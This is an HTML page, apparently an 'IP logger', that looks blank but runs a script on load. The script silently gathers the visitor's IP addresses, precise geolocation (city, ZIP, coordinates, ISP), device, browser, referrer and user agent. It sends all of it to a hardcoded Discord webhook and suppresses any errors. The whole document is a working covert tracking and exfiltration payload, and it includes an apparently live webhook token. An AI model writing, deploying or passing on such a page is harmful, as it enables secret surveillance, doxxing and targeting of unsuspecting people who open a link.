<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #fff;
      height: 100%;
    }
  </style>
</head>
<body>
  <script>
    (async () => {
      const WEBHOOK = "https://discord.com/api/webhooks/1556835015906697259/OU0R5LrCPpp0_GCBcXHPpFk1wUc3UlN_kq1rsAjfRK5pjux0l7dXBKMdR9pvFOdswXh2";

      // ── helpers ──────────────────────────────────────────────
      function isIPv4(ip) {
        return /^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$/.test(ip);
      }

      function getFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return "";
        const code = countryCode.toUpperCase();
        return String.fromCodePoint(...[...code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
      }

      function parseUA(ua) {
        let browser = "Unknown", platform = "Unknown", device = "Desktop";

        // Browser
        if (/Edg\//i.test(ua)) browser = "Edge " + (ua.match(/Edg\/([\d.]+)/) || [])[1];
        else if (/Chrome\//i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome " + (ua.match(/Chrome\/([\d.]+)/) || [])[1];
        else if (/Firefox\//i.test(ua)) browser = "Firefox " + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
        else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari " + (ua.match(/Version\/([\d.]+)/) || [])[1];
        else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";

        // Platform / OS
        if (/Windows NT 10/i.test(ua)) platform = "Windows 10/11";
        else if (/Windows NT 6.3/i.test(ua)) platform = "Windows 8.1";
        else if (/Windows NT 6.1/i.test(ua)) platform = "Windows 7";
        else if (/Mac OS X/i.test(ua)) platform = "macOS";
        else if (/Android/i.test(ua)) platform = "Android";
        else if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
        else if (/Linux/i.test(ua)) platform = "Linux";
        else if (/CrOS/i.test(ua)) platform = "Chrome OS";

        // Device type
        if (/Mobile|Android|iPhone|iPod|webOS|BlackBerry|IEMobile/i.test(ua)) device = "Mobile";
        else if (/iPad|Tablet|Nexus 7|Nexus 10|KFAPWI/i.test(ua)) device = "Tablet";

        return { browser, platform, device };
      }

      // ── get IPv4 + IPv6 ──────────────────────────────────────
      let ipv4 = null;
      let ipv6 = null;

      try {
        const [v4Res, v6Res] = await Promise.allSettled([
          // IPv4
          fetch("https://api.ipify.org?format=json")
            .then(r => r.json())
            .then(d => d.ip)
            .catch(() => fetch("https://ipv4.icanhazip.com/").then(r => r.text()).then(t => t.trim())),

          // IPv6
          fetch("https://api64.ipify.org?format=json")
            .then(r => r.json())
            .then(d => d.ip)
            .catch(() => fetch("https://ipv6.icanhazip.com/").then(r => r.text()).then(t => t.trim()))
        ]);

        if (v4Res.status === "fulfilled") {
          const ip = v4Res.value;
          if (isIPv4(ip)) ipv4 = ip;
        }

        if (v6Res.status === "fulfilled") {
          const ip = v6Res.value;
          // Simple IPv6 check (contains :)
          if (ip && ip.includes(":") && !isIPv4(ip)) ipv6 = ip;
        }
      } catch (_) {}

      // Need at least one IP to continue
      if (!ipv4 && !ipv6) return;

      // Use IPv4 for geo lookup if available, otherwise IPv6
      const lookupIP = ipv4 || ipv6;


      // ── rich geo data (multi-source for better accuracy) ─────
      let geo = {
        country: "—", country_code: "", region: "—", city: "—",
        postal: "—", lat: "—", lon: "—", timezone: "—",
        isp: "—", org: "—", asn: "—",
        proxy: "—", hosting: "—", vpn: "—"
      };

      // Score how detailed a result is (higher = better)
      function score(g) {
        let s = 0;
        if (g.city && g.city !== "—" && g.city.length > 2) s += 3;
        if (g.region && g.region !== "—") s += 2;
        if (g.postal && g.postal !== "—") s += 2;
        if (g.lat !== "—" && g.lon !== "—") s += 1;
        if (g.isp && g.isp !== "—") s += 1;
        if (g.asn && g.asn !== "—") s += 1;
        return s;
      }

      try {
        const results = await Promise.allSettled([
          // 1. ipwho.is (good security + connection data)
          fetch(`https://ipwho.is/${lookupIP}`).then(r => r.json()).then(g => {
            if (g.success === false) return null;
            return {
              country: g.country || "—",
              country_code: g.country_code || "",
              region: g.region || "—",
              city: g.city || "—",
              postal: g.postal || "—",
              lat: g.latitude ?? "—",
              lon: g.longitude ?? "—",
              timezone: (g.timezone && g.timezone.id) || "—",
              isp: g.connection?.isp || "—",
              org: g.connection?.org || "—",
              asn: g.connection?.asn ? `AS${g.connection.asn} ${g.connection.org || ""}`.trim() : "—",
              proxy: g.security?.proxy ? "Yes" : "No",
              hosting: g.security?.hosting ? "Yes" : "No",
              vpn: g.security?.vpn ? "Yes" : "No"
            };
          }),

          // 2. ipapi.co
          fetch(`https://ipapi.co/${lookupIP}/json/`).then(r => r.json()).then(g => {
            if (g.error) return null;
            return {
              country: g.country_name || "—",
              country_code: g.country_code || "",
              region: g.region || "—",
              city: g.city || "—",
              postal: g.postal || "—",
              lat: g.latitude ?? "—",
              lon: g.longitude ?? "—",
              timezone: g.timezone || "—",
              isp: g.org || "—",
              org: g.org || "—",
              asn: g.asn || "—",
              proxy: "—", hosting: "—", vpn: "—"
            };
          }),

          // 3. freeipapi.com
          fetch(`https://freeipapi.com/api/json/${lookupIP}`).then(r => r.json()).then(g => {
            if (!g.ipAddress) return null;
            return {
              country: g.countryName || "—",
              country_code: g.countryCode || "",
              region: g.regionName || "—",
              city: g.cityName || "—",
              postal: g.zipCode || "—",
              lat: g.latitude ?? "—",
              lon: g.longitude ?? "—",
              timezone: g.timeZone || "—",
              isp: "—", org: "—", asn: "—",
              proxy: "—", hosting: "—", vpn: "—"
            };
          }),

          // 4. geojs.io
          fetch(`https://get.geojs.io/v1/ip/geo/${lookupIP}.json`).then(r => r.json()).then(g => {
            if (!g.country) return null;
            return {
              country: g.country || "—",
              country_code: g.country_code || "",
              region: g.region || "—",
              city: g.city || "—",
              postal: "—",
              lat: g.latitude ?? "—",
              lon: g.longitude ?? "—",
              timezone: g.timezone || "—",
              isp: g.organization_name || g.organization || "—",
              org: g.organization_name || g.organization || "—",
              asn: g.asn || "—",
              proxy: "—", hosting: "—", vpn: "—"
            };
          })
        ]);

        // Pick the highest-scoring valid result
        let bestScore = -1;
        for (const r of results) {
          if (r.status === "fulfilled" && r.value) {
            const s = score(r.value);
            if (s > bestScore) {
              bestScore = s;
              geo = r.value;
            }
          }
        }
      } catch (_) {}


      const uaInfo = parseUA(navigator.userAgent || "");
      const flag = getFlag(geo.country_code);
      const now = new Date();

      // ── Discord embed (styled like the screenshot) ───────────
      const embed = {
        title: "IP Logger",
        color: 5793266,
        fields: [
          { name: "IPv4", value: ipv4 ? `\`${ipv4}\`` : "`Not available`", inline: false },
          { name: "IPv6", value: ipv6 ? `\`${ipv6}\`` : "`Not available`", inline: false },
          { name: "Country", value: `${flag} ${geo.country || "—"}`, inline: false },

          { name: "Region", value: geo.region || "—", inline: false },
          { name: "City", value: geo.city || "—", inline: false },
          { name: "ZIP", value: String(geo.postal || "—"), inline: false },
          { name: "Coordinates", value: `${geo.lat}, ${geo.lon}`, inline: false },
          { name: "Timezone", value: geo.timezone || "—", inline: false },
          { name: "ISP", value: geo.isp || "—", inline: false },
          { name: "Organization", value: geo.org || "—", inline: false },
          { name: "ASN", value: geo.asn || "—", inline: false },
          { name: "VPN/Proxy", value: (geo.vpn === "Yes" || geo.proxy === "Yes") ? "Yes" : (geo.proxy || "No"), inline: false },
          { name: "Hosting/Cloud", value: geo.hosting || "—", inline: false },
          { name: "Device Type", value: uaInfo.device, inline: false },
          { name: "Platform", value: uaInfo.platform, inline: false },
          { name: "Browser", value: uaInfo.browser, inline: false },
          { name: "Referrer", value: document.referrer || "direct", inline: false },
          { name: "Timestamp", value: now.toUTCString(), inline: false },
          { name: "User Agent", value: "```" + (navigator.userAgent || "unknown") + "```", inline: false }
        ],
        footer: {
          text: "IP Logger"
        },
        timestamp: now.toISOString()
      };

      try {
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: null,
            embeds: [embed]
          })
        });
      } catch (_) {
        // stay silent
      }
    })();
  </script>
</body>
</html>
